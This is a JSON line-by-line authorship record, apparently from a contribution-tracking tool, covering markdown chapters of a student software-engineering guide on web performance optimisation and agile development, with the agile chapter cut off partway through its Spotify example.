        "content": "Web Performance is a broad term that refers to how performant a web application *feels* to its users. This includes many aspects such as how long the site takes to load, how quickly the site becomes interactive, and how responsive it feels when the user interacts with the site."
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "-"
        },
        "content": "As web applications grow more complex, it becomes increasingly important for web developers to be aware of the factors that affect performance, and consider how performance can impact the user experience."
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Why Web Performance Matters?"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": "The performance of your web application has a direct impact on its ability to attract and retain users:"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": "- Sites which take more than 3 seconds to load are more likely to be abandoned by users [[source](https://developer.akamai.com/blog/2016/09/14/mobile-load-time-user-abandonment)]."
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": "- Conversely, reducing page load times have been shown to have significant impact on improving user engagement [[source](https://medium.com/carousell-insider/how-we-made-carousells-mobile-web-experience-3x-faster-bbb3be93e006)]."
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": "- In addition, search engines have begun to use page load times as a factor in determining search rankings [[source](https://webmasters.googleblog.com/2018/01/using-page-speed-in-mobile-search.html)]."
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "- Improving web performance is also essential in making your web application accessible to users from emerging markets, where low-end devices and limited bandwidth are the norm [[source](https://building.calibreapp.com/beyond-the-bubble-real-world-performance-9c991dcd5342)]."
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "In order to deliver a positive user experience, web developers must ensure that their applications meet acceptable performance standards."
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "## Key Ideas in Improving Web Performance"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "There are many factors which affect web performance. Here, we give an overview of some of the key ideas that can be used to improve the performance of your web application."
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "**Idea 1: Reduce Javascript Payloads**"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "Loading and executing Javascript is often the slowest part of the page load process [[source](https://medium.com/@addyosmani/the-cost-of-javascript-in-2018-7d8950fbb5d4)]. Reducing the amount of Javascript that needs to be loaded thus significantly reduces the time taken for your site to load."
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "Here are some steps that web developers can take to reduce the amount of Javascript that clients need to load:"
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "- Use code splitting to load only the Javascript required for the page being accessed [[source](https://developers.google.com/web/fundamentals/performance/optimizing-javascript/code-splitting/)]."
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "- Remove unused code (often parts of libraries that are not used in the application) with tree shaking [[source](https://developers.google.com/web/fundamentals/performance/optimizing-javascript/tree-shaking/)]."
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "- Ensure that the delivered Javascript is minified [[source](https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/javascript-startup-optimization/)]."
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "- Create performance budgets that specify the maximum size of Javascript payloads, and enforce them to ensure that the size of your Javascript payloads remain under control [[source](https://web.dev/fast/incorporate-performance-budgets-into-your-build-tools)]."
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "**Idea 2: Optimize Images**"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "Images form a significant portion of the resources loaded on web applications [[source](https://httparchive.org/reports/page-weight)]. To improve performance and speed up the site for users, web developers should thus try to reduce the amount of bandwidth used to load images."
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "Images can be optimized for the web in the following ways:"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "- Use the correct file format that provides the appropriate balance between quality, detail, and file size. For example, you should use JPEG for photographs that contain lots of colors, PNG for logos and icons which have less colors but contain sharper details, and GIF for animated images [[source](https://medium.com/beginners-guide-to-mobile-web-development/web-image-formats-googles-webp-17e2fe5fc53e)]."
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "- Compress your images to reduce the amount of data that needs to be loaded [[source](https://www.html5rocks.com/en/tutorials/speed/img-compression/)]. Be careful to strike a balance between image size and quality for optimal user experience."
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "- Deliver appropriately sized images based on the resolution of the client device [[source](https://developer.mozilla.org/en-US/docs/Learn/HTML/Multimedia_and_embedding/Responsive_images)]. This prevents smaller (often mobile or lower-end) devices from wasting bandwidth loading large images that cannot be displayed at their full resolution on the device."
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "**Idea 3: Use Progressive Rendering**"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "The sooner the user sees content being displayed on the page, the faster they perceives the site to be. Progressive rendering achieves this by avoiding rendering the entire page all at once, but instead ordering the loading of content in a manner that allows *some* parts of the page to be rendered as quickly as possible."
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "Here are several ways how progressive loading can be effectively applied:"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "- Load only the most critical content as part of the initial render, and fetch remaining resources asynchronously after the render [[source](https://developers.google.com/web/fundamentals/performance/critical-rendering-path/)]. Code splitting can also be helpful here to reduce the amount of Javascript that needs to be loaded for the initial render [[source](https://developers.google.com/web/fundamentals/performance/optimizing-javascript/code-splitting/)]."
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "- Use lazy loading to defer requesting non-critical resources until they are needed [[source](https://developers.google.com/web/fundamentals/performance/lazy-loading-guidance/images-and-video/)]."
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "- Show content placeholders while fetching resources to indicate loading progress to the user [[source](https://medium.com/@praveencnaik/content-placeholder-the-new-design-trend-for-audience-involvement-e2ab533d7304)]."
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "## Measuring Web Performance"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "Improving web performance is a continuous, ongoing process. The ability to measure and track performance is necessary for developers to monitor the impact of their changes over time."
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "Here are some ways that you can measure the performance of your web applications:"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "- Test your site under various network conditions with [Chrome DevTools](https://developers.google.com/web/tools/chrome-devtools/network/network-conditions). This is helpful to get a feel for how the site feels for users on slower devices during the development process."
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "- Audit web performance using [Lighthouse](https://developers.google.com/web/tools/lighthouse/). This provides many useful metrics for understanding the performance of your site and identifying performance bottlenecks under controlled conditions."
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "- Use [WebPageTest](https://www.webpagetest.org/) to test the performance of your website from multiple locations around the world at real consumer connection speeds. This provides real-world performance indicators that is especially useful if the target audience of your site resides in a different region."
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "- Collect user-centric performance metrics to help you to monitor how your application actually performs in a real-world scenario, and how your site performance relates to other user engagement metrics [[source](https://developers.google.com/web/fundamentals/performance/user-centric-performance-metrics)]."
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "## Additional Resources"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "- [Google\u0027s Web Performance Fundamentals](https://developers.google.com/web/fundamentals/performance/why-performance-matters/) is a comprehensive resource that explains many factors that affect web performance."
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "- [Kinsta\u0027s Beginner Guide to Website Speed Optimization](https://kinsta.com/learn/page-speed/) is a guided resource for improving website speeds."
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "- [Twitter Lite Case Studey](https://medium.com/@paularmstrong/twitter-lite-and-high-performance-react-progressive-web-apps-at-scale-d28a00e780a3) is a real-world study that highlights how web performance principles can be applied to great effect."
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 2,
      "-": 81
    }
  },
  {
    "path": "contents/projectManagement/AgileDevelopment.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Agile Development"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Agile Development"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Author: [Joanne Ong](https://github.com/joanneong)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": "## Overview"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "-"
        },
        "content": "In 2015, Forbes published an article boldly titled [Agile: The World\u0027s Most Popular Innovation Engine](https://www.forbes.com/sites/stevedenning/2015/07/23/the-worlds-most-popular-innovation-engine/#22b176267c76). Indeed, as a software engineering student, you may have heard of the term \"agile development\", \"agile model\" or even simply \"agile\" before. In this chapter, we will explore agile development in greater depth, and learn why agile development is still thriving today."
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## What is Agile Development?"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "Popularised in 2001 by the [*Manifesto for Agile Software Development*](https://agilemanifesto.org/), agile development is essentially a software development approach that can be adopted to manage a software project."
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "-"
        },
        "content": "Yet, you should not mistake agile development for any single method or framework (e.g. [Scrum](https://www.scrum.org/resources/what-is-scrum?gclid\u003dEAIaIQobChMI2Y-34IDX2QIVwZWPCh3aUg7tEAAYASAAEgLPKvD_BwE)). Rather, you should see agile development as an overarching approach possessing several distinguishing characteristics as consolidated in the *Manifesto*. To further simplify these characteristics, agile development can essentially be described as an approach that is flexible, iterative and people-centric."
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": "But what does \"flexible, iterative and people-centric\" really mean? To comprehend this, let us examine each characteristic individually."
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "#### 1. Agile Development is \"Flexible\""
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "For a start, agile development is \"flexible\" because it gives a project more room to evolve over time. This is possible as agile development utilises a form of planning known as [adaptive planning](https://www.projectmanager.com/blog/how-to-plan-in-an-agile-environment), which means that planning is done continuously throughout a project rather than sticking rigidly to a fixed plan established at the start. As a result, planning can take into consideration the project\u0027s current progress, and change accordingly to allow the project\u0027s priorities and scope to evolve."
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "To visualise this, let us consider adaptive planning in a game below:"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "\u003eImagine playing the old Battleships Game. You are using a traditional business strategy, which means that you have to select all your moves up front and then sit back and wait to see if you have won. I am using an agile business strategy, which means I can make a move, see what happens, learn from this, and adapt. Guess who is more likely to win?"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e"
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "\u003e-- from [An agile, adaptive business strategy](https://agileforeveryone.com/2015/04/24/agile-adaptive-business-strategy-with-scrum/) by Edwin Dando"
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "#### 2. Agile Development is \"Iterative\""
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "Secondly, agile development is \"iterative\" because it breaks product development work down into short cycles known as [iterations](https://www.agilealliance.org/glossary/iteration/). Each iteration involves going through planning, designing, coding and testing to result in a working product at the end of an iteration. However, a single iteration may not have added enough functionality to warrant a new release, so in reality multiple iterations are often required to release a new product or feature. Here is a diagram to illustrate this concept:"
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "![Agile Development - Iterations](images/projectManagement-agileDev-iterations.jpg)"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "#### 3. Agile Development is \"People-Centric\""
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "Thirdly, agile development is \"people-centric\" because it focuses heavily on collaboration and effective communication. In fact, there are many recommendations on how to form a good agile team. While the specifics vary in accordance with the framework that you choose, the general consensus remains that agile development involves several crucial team roles that work in close relation with each other."
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "In particular, agile development also zooms in on direct and simple conversations as the main mode of communication. For example, popular agile frameworks like [Scrum](https://www.scrum.org/resources/what-is-scrum?gclid\u003dEAIaIQobChMIrJLEjuPV2QIV1BuPCh17KwH_EAAYASAAEgKXPfD_BwE) and [Kanban](https://www.atlassian.com/agile/kanban) typically have daily meetings called stand-ups where participants meet for no more than 15 minutes while standing up. Each team member simply answers three questions: \"what did I complete yesterday\", \"what will I work on today\", and \"am I blocked by anything?\", quickly informing everyone of what is going on across the team."
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "The key characteristics then enable our software projects to gain numerous benefits when agile development is adopted to manage the project."
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Why Adopt Agile Development?"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "There are quite a number of reasons why you might want to adopt development, but here are three of the most pertinent reasons why:"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "1. **Agile development can increase user satisfaction with the product.**"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "    As a project and system unfolds, stakeholders often discover that what they originally requested for at the start of the project may not be what they really want. Luckily, since agile development is \"flexible\", the project’s priorities and scope can be readjusted to accommodate how the project is evolving. By the end of the project, the product will tend to stick closer to what stakeholders really want, increasing their satisfaction with the product."
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "2. **Agile development can increase product quality.**"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "    Under agile development, [testing](https://smartbear.com/learn/automated-testing/testing-in-agile-environments/) is part of every single iteration, so any bugs in the product can be found and fixed earlier and more easily. This can then result in increased product quality as bugs are kept to a minimum to ensure that working software is delivered at the end of each iteration."
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "3. **Agile development can increase project control.**"
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "    Project control can be succinctly defined as the management of a project’s costs and schedule. With agile development’s iterative and people-centric nature, project managers can gain more opportunities to monitor what is going on in the project and assess the project’s progress more accurately. If need be, the project manager can also communicate with the client to decide whether to change the scope of the project. Even in the worst case scenario, agile development will still guarantee a working product delivered by the deadline since changes are made incrementally, eliminating the risk of total project failure."
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## How to Adopt Agile Development?"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "Now that you have a glimpse of what agile development can offer you, you may be wondering, how can you adopt agile development in your software projects?"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "As introduced previously, agile development can actually be seen as a high-level concept (or abstraction) that describes certain principles to follow in a software project. As a result, different software projects can choose to implement agile development differently to fit their own circumstances."
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "That said, there are many agile development frameworks that can help to guide you along the way. Examples of popular agile frameworks include (but are not limited to):"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "- [Scrum](https://www.scrum.org/resources/what-is-scrum?gclid\u003dEAIaIQobChMI2Y-34IDX2QIVwZWPCh3aUg7tEAAYASAAEgLPKvD_BwE)"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "- [Kanban](https://www.atlassian.com/agile/kanban)"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "- [Scrumban](https://www.agilealliance.org/what-is-scrumban/)"
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "- [Lean Software Development](https://leankit.com/learn/lean/principles-of-lean-development/)"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "- [Extreme Programming (XP)](http://www.agilenutshell.com/xp)"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- [Feature-Driven Development (FDD)](https://agilemodeling.com/essays/fdd.htm)"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- [Dynamic Systems Development Method (DSDM)](https://dsdmofagilemethodology.wikidot.com/)"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "In addition to such agile frameworks, there are also many concrete practices that support agile development. These practices span over aspects like requirements, design, coding, testing and risk management, potentially easing your transition to agile development:"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- [User Stories](https://www.agilemodeling.com/artifacts/userStory.htm)"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "- [User Story Mapping](https://www.thoughtworks.com/insights/blog/story-mapping-visual-way-building-product-backlog)"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "- [Backlogs](https://www.agilealliance.org/glossary/backlog/)"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "- [Velocity Tracking](http://www.softwaretestingstudio.com/agile-velocity-sprint-metrics/)"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "- [Timeboxing](https://www.telerik.com/blogs/the-importance-of-timeboxing-and-iterations-for-agile-planning)"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "- [Pair Programming](https://www.codementor.io/pair-programming)"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "- [Test Driven Development (TDD)](https://www.agiletestingframework.com/atf/testing/test-driven-development-tdd/)"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "- [Continuous Integration](http://istqbexamcertification.com/what-is-continuous-integration-in-agile-methodology/)"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "- [Reflection loops](https://dzone.com/articles/reflection-loops-agile)"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "Of course, your project does not have to be utilising **all** the frameworks/concrete practices in order to be agile in its development. Instead, great care should be taken to analyse and select the appropriate framework/concrete practices that will work best for the project."
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Caveats: What can Possibly go Wrong?"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "Given that agile development can bring about so many benefits to our software projects, we must not forget that things can still go very wrong when using agile development. Such unfortunate situations are known as [agile anti-patterns](https://age-of-product.com/agile-management-anti-patterns/), or [agile smells](https://medium.com/agile-government-leadership/when-good-scrum-goes-bad-identifying-bad-agile-smells-690e7a16b501), and some common problems include:"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "- **Unfamiliarity with agile development**"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "    If the team is unfamiliar with agile techniques, you will not be able to reap the full benefits of agile development since agile development depends on tight collaboration between team members. Therefore, it is crucial to ensure that the entire team has good foundations in agile techniques before the transition to agile development. This can be achieved by investing early in training sessions for the team, and bring everyone in the team up-to-date with what agile development entails for the project."
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "- **Over-reliance on manual testing**"
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "    If the team relies too much on manual testing, agile development will likely be a nightmare for the team. Recall that agile development is iterative, and that testing a part of every single iteration, so with merely manual testing, the team will be forced to spend an unreasonable amount of time and effort on testing alone. Consequently, it is standard practice to employ [automated testing](https://reqtest.com/agile-blog/you-cant-work-agile-without-automated-testing/) in agile development to allow developers and testers to focus on work that can be of higher value to the project."
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "- **Structural rigidity in larger organisations**"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "    If the team is operating in the context of a large organisation, agile development may not work out as well as it promises to. Unsurprisingly, transiting to agile development in large organisations poses great challenges because large organisations tend to have many established protocols and workflows in place. These protocols may then be familiar to the organisations but are not necessarily in line with agile principles and ideals, but discarding them entirely would cause huge disruptions to the organisations. To combat this, larger organisations can think about [hybrid models](https://www.agilealliance.org/what-is-hybrid-agile-anyway/) - combining Agile methods with other non-Agile techniques that the organisation is currently accustomed to."
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Putting it all Together: The Spotify Success Story"
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "By now, you should have gained a healthy understanding of agile development: **what** it is, **why** we should adopt it, and **how** we can adopt it. As a conclusion, let us look at a small example of how [Spotify](https://www.spotify.com/sg-en/) - a Swedish music, podcast and video streaming service with over 70 million paying subscribers in 2018 - managed to apply agile development successfully to reap the benefits associated with agile development."
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "\u003eIn 2015, a small team in Spotify had an idea to solve a long-standing problem: how could users find the music they would really love in a library of millions of songs?...The team didn’t need a whole lot of ROI analyses or go up a steep hierarchical chain to get management approval to change the firm’s strategic plan. In an Agile setting, it was quick and easy for the team to carry out a series of tests. When the innovation, now known as Discover Weekly, was deployed just a few months later, it was a wild success—becoming not just a new feature but a global brand, resulting in an influx of millions of new users. The Discover Weekly team is just one of more than 100 small teams at Spotify, which has deployed Agile approaches to all work since its inception in 2008."
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e"
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
